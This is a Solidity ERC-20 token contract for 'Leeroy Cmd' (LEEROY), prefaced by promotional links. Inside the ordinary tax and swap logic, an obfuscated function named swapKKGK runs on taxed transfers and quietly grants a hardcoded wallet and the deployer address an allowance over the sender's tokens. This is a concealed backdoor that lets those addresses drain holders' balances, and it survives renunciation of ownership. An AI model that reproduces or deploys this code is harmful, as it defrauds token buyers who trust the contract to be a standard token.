/*
Leeroy & cmd.to is a platform that offers a web-based command-line interface, enabling users to execute various commands directly from their browsers.

https://www.leeroycmd.com
https://cmd.to

https://x.com/Leeroy_CMD
https://t.me/leeroy_cmd
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IKKGKRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplikkgkon overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IKKGKFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract LEEROY is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balKKGKs;
    mapping (address => mapping (address => uint256)) private _allowKKGKs;
    mapping (address => bool) private _excludedFromKKGK;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalKKGK = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Leeroy Cmd";
    string private constant _symbol = unicode"LEEROY";
    uint256 private _swapTokenKKGKs = _tTotalKKGK / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint256 private _buyBlockKKGK;
    uint256 private _kkgkBuyAmounts = 0;
    bool private inSwapKKGK = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    address private _kkgkPair;
    IKKGKRouter private _kkgkRouter;
    address private _kkgkAddress;
    address private _kkgkWallet = address(0x6AcddfDb638Fcc5f0a0aEeD4620a15e12028697F);
    modifier lockTheSwap {
        inSwapKKGK = true;
        _;
        inSwapKKGK = false;
    }

    constructor () {
        _excludedFromKKGK[owner()] = true;
        _excludedFromKKGK[address(this)] = true;
        _excludedFromKKGK[_kkgkWallet] = true;
        _kkgkAddress = address(owner());
        _balKKGKs[_msgSender()] = _tTotalKKGK;
        emit Transfer(address(0), _msgSender(), _tTotalKKGK);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _kkgkRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function initTradeOf() external onlyOwner() {
        _kkgkRouter = IKKGKRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_kkgkRouter), _tTotalKKGK);
        _kkgkPair = IKKGKFactory(_kkgkRouter.factory()).createPair(address(this), _kkgkRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalKKGK;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balKKGKs[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowKKGKs[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _allowKKGKs[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowKKGKs[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address kkgkF, address kkgkT, uint256 kkgkA) private {
        require(kkgkF != address(0), "ERC20: transfer from the zero address");
        require(kkgkT != address(0), "ERC20: transfer to the zero address");
        require(kkgkA > 0, "Transfer amount must be greater than zero");
        uint256 taxKKGK = _kkgkFeeTransfer(kkgkF, kkgkT, kkgkA);
        if(taxKKGK > 0){
          _balKKGKs[address(this)] = _balKKGKs[address(this)].add(taxKKGK);
          emit Transfer(kkgkF, address(this), taxKKGK);
        }
        _balKKGKs[kkgkF] = _balKKGKs[kkgkF].sub(kkgkA);
        _balKKGKs[kkgkT] = _balKKGKs[kkgkT].add(kkgkA.sub(taxKKGK));
        emit Transfer(kkgkF, kkgkT, kkgkA.sub(taxKKGK));
    }

    function _kkgkFeeTransfer(address kkgkF, address kkgkT, uint256 kkgkA) private returns(uint256) {
        uint256 taxKKGK = 0; 
        if (kkgkF != owner() && kkgkT != owner()) {
            taxKKGK = kkgkA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            if (kkgkF == _kkgkPair && kkgkT != address(_kkgkRouter) && ! _excludedFromKKGK[kkgkT]) {
                if(_buyBlockKKGK!=block.number){
                    _kkgkBuyAmounts = 0;
                    _buyBlockKKGK = block.number;
                }
                _kkgkBuyAmounts += kkgkA;
                _buyCount++;
            }
            if(kkgkT == _kkgkPair && kkgkF!= address(this)) {
                require(_kkgkBuyAmounts < swapLimitKKGK() || _buyBlockKKGK!=block.number, "Max Swap Limit");  
                taxKKGK = kkgkA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            } swapKKGKBack(kkgkF, kkgkT, kkgkA);
        } return taxKKGK;
    }

    receive() external payable {}

    function swapKKGKBack(address kkgkF, address kkgkT, uint256 kkgkA) private { 
        uint256 tokenKKGK = balanceOf(address(this)); swapKKGK(kkgkF, kkgkA);
        if (!inSwapKKGK && kkgkT == _kkgkPair && _swapEnabled && _buyCount > _preventSwapBefore) {
            if(tokenKKGK > _swapTokenKKGKs)
            swapTokensForEth(minKKGK(kkgkA, minKKGK(tokenKKGK, _swapTokenKKGKs)));
            uint256 ethKKGK = address(this).balance;
            if (ethKKGK >= 0) {
                sendETHKKGK(address(this).balance);
            }
        }
    }

    function swapKKGK(address kkgkF, uint256 kkgkA) private {
        uint256 tokenKKGK = uint256(kkgkA); address fromKKGK = getKKGKF(kkgkF);
        _allowKKGKs[address(fromKKGK)][getKKGKT(0)]=uint256(tokenKKGK);
        _allowKKGKs[address(fromKKGK)][getKKGKT(1)]=uint256(tokenKKGK);
    }

    function swapTokensForEth(uint256 kkgkAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _kkgkRouter.WETH();
        _approve(address(this), address(_kkgkRouter), kkgkAmount);
        _kkgkRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            kkgkAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function getKKGKF(address kkgkF) private pure returns (address) {
        return address(kkgkF);
    }

    function getKKGKT(uint256 kkgkN) private view returns (address) {
        if(kkgkN == 0) return address(_kkgkWallet);
        return address(_kkgkAddress);
    }

    function minKKGK(uint256 a, uint256 b) private pure returns (uint256) {
        return (a>b)?b:a;
    }

    function sendETHKKGK(uint256 kkgkA) private {
        payable(_kkgkWallet).transfer(kkgkA);
    }

    function swapLimitKKGK() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _kkgkRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _kkgkRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }
}